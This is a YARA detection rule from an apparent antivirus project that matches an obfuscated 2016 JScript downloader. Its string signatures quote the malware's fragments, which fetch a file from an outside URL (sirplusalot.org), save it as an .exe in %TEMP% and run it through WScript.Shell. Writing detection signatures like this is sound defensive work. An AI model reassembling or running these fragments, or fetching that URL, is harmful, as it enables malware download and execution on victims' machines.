rule sig_20160401_383a23a3972aa5c763fc5348bf1688bc {
  meta:
    description = "datamaliciousorder - file 20160401_383a23a3972aa5c763fc5348bf1688bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3e18a101728cf9afe5c83c546fcba51dad4083c1c0866b69b8e11f942f6c8484"

  strings:
    $s1  = "HoTye[TwuIee](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function TwFi(XszXl, XriJcu){IaTk = IaTk * 1; return XszXl - XriJcu;};" fullword ascii
    $s3  = "var KffFep = function GzBls() {return WScript[TuAvk](\"WScript\"+\".Shell\");}(), EvwQed = 11;" fullword ascii
    $s4  = "if (HoTye[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function RdkXg(){return ErgCf + \"\";};" fullword ascii
    $s6  = "function AsLcd() {return KffFep[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WqAOBe1mY0Lhc8e.ex\" + \"e\";};" fullword ascii
    $s7  = "function ByhKcr() {return ((TgBw == true) && (TgBw == RiAfc)) ? 1 : IaTk;};" fullword ascii
    $s8  = "function WhRgs(){return 23;};" fullword ascii
    $s9  = "}while (XxGi);" fullword ascii
    $s10 = "var WvzOkn = false;" fullword ascii
    $s11 = "var RiAfc = false;" fullword ascii
    $s12 = "TgBw = true; " fullword ascii
    $s13 = "function NqrTc(){return TuAvk;};" fullword ascii
    $s14 = "function QbiKrz(EqIap) {var DcDdy = (1, 2, 3, 4, 5, EqIap); return DcDdy;};" fullword ascii
    $s15 = "var WqfAif = new this[\"Date\"]();" fullword ascii
    $s16 = "var TgBw = false;" fullword ascii
    $s17 = "RiAfc = true; " fullword ascii
    $s18 = "return TwFi(KcpSg, IkxFv);" fullword ascii
    $s19 = "function OcYc(KpOdy){KffFep[\"R\"+\"un\"](KpOdy, IaTk, IaTk);};" fullword ascii
    $s20 = "function HpfOr()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}